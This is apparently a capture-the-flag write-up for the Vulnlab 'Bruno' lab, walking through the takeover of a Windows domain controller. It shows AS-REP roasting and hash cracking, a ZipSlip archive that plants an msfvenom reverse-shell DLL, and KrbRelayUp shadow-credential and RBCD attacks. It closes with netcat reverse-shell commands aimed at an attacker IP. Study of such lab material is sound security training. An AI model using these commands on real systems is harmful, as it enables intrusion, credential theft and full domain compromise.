# Vulnlab - Bruno

```bash
PORT      STATE SERVICE    VERSION   
21/tcp    open  tcpwrapped
53/tcp    open  tcpwrapped
80/tcp    open  tcpwrapped                    
135/tcp   open  tcpwrapped             
139/tcp   open  tcpwrapped             
443/tcp   open  tcpwrapped
88/tcp open  kerberos-sec
| tls-alpn:                                      
|_  http/1.1              
| ssl-cert: Subject: commonName=bruno-BRUNODC-CA
| Issuer: commonName=bruno-BRUNODC-CA
| Public Key type: rsa    
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-06-29T13:23:01
| Not valid after:  2121-06-29T13:33:00
| MD5:   659b3c9000eb1e0a51701be90456840c 
|_SHA-1: a093f4c23c8e053286f21e99cad782f8e40e3d72
445/tcp   open  tcpwrapped
636/tcp   open  tcpwrapped
| ssl-cert: Subject: commonName=brunodc.bruno.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:brunodc.bruno.vl
| Issuer: commonName=bruno-BRUNODC-CA
| Public Key type: rsa               
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-08-22T06:05:15     
| Not valid after:  2024-08-21T06:05:15
| MD5:   1f78c03b2d8da3ec00765fcc68d5973b
|_SHA-1: be3a109df3cfefcf7a8078654bbbf09ae7950fd5
3269/tcp  open  tcpwrapped
| ssl-cert: Subject: commonName=brunodc.bruno.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:brunodc.bruno.vl
| Issuer: commonName=bruno-BRUNODC-CA
3389/tcp  open  tcpwrapped
| ssl-cert: Subject: commonName=brunodc.bruno.vl
| Issuer: commonName=brunodc.bruno.vl
```
## PORT 21 (FTP)

Logging in as an anonymous user on FTP, we can find few directories

<img src="https://i.imgur.com/acTC2SM.png"/>

From `app` folder, there's `SampleScanner`

<img src="https://i.imgur.com/klKdF6I.png"/>

Reading the `changelog` file we can see a username `svc_scan`

<img src="https://i.imgur.com/lR5Jc2N.png"/>

Since we are targeting a domain controller, we can check for ASREP roasting (accounts with pre-authentication disabled)

<img src="https://i.imgur.com/Lq9u6HO.png"/>

Having the hash, attempting to crack it against hashcat

```bash
hashcat -a 0 -m 18200 ./svc_scan.txt /usr/share/wordlists/rockyou.txt  --force
```

<img src="https://i.imgur.com/61lcX2x.png"/>
Listing the shares with this user, we have write access on `queue`

<img src="https://i.imgur.com/qwfF6Hz.png"/>

On this point, we need to understand what sample scanner is doing and what's the use of this queue share folder, using `ILSpy` to analyze the SampleScanner.dll

<img src="https://i.imgur.com/pCIun5Z.png"/>

## DLL Hijacking

This dll looks for a zip file in `C:\Samples\queue` , extracts the file and deletes the zip file, if it's not a zip file it checks for the occurrence of the AV test file pattern defined by the text string and place it into malicious folder else it places it into bengin folder, so running this locally by transferring all required files 

<img src="https://i.imgur.com/YX6KCuf.png"/>

Creating `\sample\queue` in C:\ and placing a zip file for testing

<img src="https://i.imgur.com/zTUb65G.png"/>

Running `SampleScanner` will extract the contents of the zip file

<img src="https://i.imgur.com/G93mbTw.png"/>

<img src="https://i.imgur.com/9ppQBfX.png"/>

Here we canperform path traversal to extract the file in any location which is known as `ZipSlip`, for creating a malicious zip file we can use `evilarc.py` (https://github.com/ptoomey3/evilarc) or we can use 7zip to edit the filename to be `..\file.txt`

<img src="https://i.imgur.com/mElNBIw.png"/>

This will extract the contents of `evil.zip` outside the directory of `C:\Samples\queue`

<img src="https://i.imgur.com/CB3XFYF.png"/>

Since this is being ran with `svc_scan` we can achieve remote code execution by replacing the dll being used with SampleScanner, for that we need to analyze which dll we need to place, with `Process Monitor` we can analyze which DLL is missing from the program by applying filters for the DLLs which are not found by the exe

<img src="https://i.imgur.com/sm5mqHa.png"/>

Here we see two DLLs which are being used by this program but are not found in the current path, `hostfxr.dll` and `Microsoft.DiaSymReader.Native.amd64.dll` , generating a dll through `msfvenom` and replacing the DiaSymReader dll 

<img src="https://i.imgur.com/0HlvYxj.png"/>

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.154 LPORT=2222 -f dll > test.dll
```

<img src="https://i.imgur.com/5ehJKyH.png"/>

Executing SampleScanner now will trigger a reverse shell as we have placed our maclious dll

<img src="https://i.imgur.com/9yM8yku.png"/>

To do this on the target machine, we need to place the dll with a path traversal `..\app\Microsoft.DiaSymReader.Native.amd64.dll`, since svc_scan has write access to `queue` share folder we can upload the archive file through smb

<img src="https://i.imgur.com/2BXYzXJ.png"/>
Within seconds we'll receive a connection on our listener 

<img src="https://i.imgur.com/ArVYtNh.png"/>

Checking the privileges of svc_scan user, it have any interesting privileges 

<img src="https://i.imgur.com/zsIlYob.png"/>Running python-bloodhound to enumerate the domain

```bash
python3 bloodhound.py -u 'svc_scan' -p 'Sunshine1' -d 'bruno.vl' -c all -ns 10.10.84.94 --auth-method ntlm
```

<img src="https://i.imgur.com/ed2YyG4.png"/>
There wasn't any path leading to domain admin from svc_scan

<img src="https://i.imgur.com/U00c4Nf.png"/>
However we can see `svc_net` being AS-REP roastable

<img src="https://i.imgur.com/5wJIm1r.png"/>
Through `GetNPUsers.py` we can retrieve TGT of svc_net and attempt to crack it 

```bash
GetNPUsers.py bruno.vl/svc_net -no-pass -dc-ip 10.10.108.253
```

<img src="https://i.imgur.com/jNeKW5H.png"/>

<img src="https://i.imgur.com/1ECqVsi.png"/>
Which is the same password as svc_scan, also this user doesn't didn't had any special privileges, from winpeas we can see target being vulnerable to `KrbRelayUp`

<img src="https://i.imgur.com/g32E4TL.png"/>

## Shadow Credentials

To escalate privileges through KrbRelayUp, we need ensure that LDAP singing is disabled and we are allowed to add a machine account, however this is optional as we can abuse shadow credentials if PKINT is supported by DC, through cme we can verify the machine qouta

```bash
cme ldap bruno.vl -u 'svc_scan' -p 'Sunshine1' -M maq
```

<img src="https://i.imgur.com/Gg75LxD.png"/>

Also we can see ldap signing is not enforced 

```bash
cme ldap bruno.vl -u 'svc_scan' -p 'Sunshine1' -M ldap-checker
```

<img src="https://i.imgur.com/jovC7Z1.png"/>

For using krbrealyup, we need a valid CLSID, I grabbed the `certsrv` ID from https://vulndev.io/cheats-windows/

<img src="https://i.imgur.com/rK4AjY6.png"/>

Using the shadow credentials method on port 10246, as this was the port which was available

```
.\KrbRelayUp.exe full -m shadowcred -cls {d99e6e73-fc88-11d0-b498-00a0c90312f3} -p 10246
```

<img src="https://i.imgur.com/ken0ghS.png"/>

Now using Rubeus, to request a TGT for `brunodc` through `PKINT` authentication

```
Rubeus.exe asktgt /user:brunodc$ /certificate:MIIKSAIBAzCCCgQGC...snip.... /password:tV0-oN8$aB7- /enctype:AES256 /nowrap
```

<img src="https://i.imgur.com/rRUj4SS.png"/>

Converting the kirbi ticket for brunodc to ccache so we can use it with `secretsdump.py`

<img src="https://i.imgur.com/aHyjg4M.png"/>

```bash
secretsdump.py 'brunodc$'@brunodc.bruno.vl -k -no-pass
```

<img src="https://i.imgur.com/RvfIiKi.png"/>

<img src="https://i.imgur.com/jWOdqVf.png"/>

## Resource Based Constrained Delegation

We can also perform Resource Based Constrained Delegation (RBCD) by creating machine account and that account in brunodc's `msDS-AllowedToActOnBehalfOfOtherIdentity` property

```
.\KrbRelayUp.exe full -m rbcd -c -cls {d99e6e73-fc88-11d0-b498-00a0c90312f3} -p 10246
```

<img src="https://i.imgur.com/mqc5goa.png"/>
Requesting the administrator's TGT through `getST.py`

<img src="https://i.imgur.com/PbrvjZD.png"/>

Having the ticket, we can login through `smbexec.py`

<img src="https://i.imgur.com/fX90yHa.png"/>

# References

- https://github.com/ptoomey3/evilarc
- https://github.com/cesarsotovalero/zip-slip-exploit-example/blob/master/README.md
- https://icyguider.github.io/2022/05/19/NoFix-LPE-Using-KrbRelay-With-Shadow-Credentials.html
- https://github.com/Dec0ne/KrbRelayUp
- https://vulndev.io/cheats-windows/
- http://ohpe.it/juicy-potato/CLSID/


```
svc_scan:Sunshine1

\RunasCs.exe svc_scan 'Sunshine1' -d bruno.vl 'C:\Users\svc_scan\nc64.exe 10.8.0.136 2222 -e cmd.exe' -l 9

.\RunasCs.exe svc_net "Sunshine1" "C:\Users\svc_scan\nc64.exe 10.8.0.136 2222 -e cmd.exe" -d bruno.vl -l 9
```
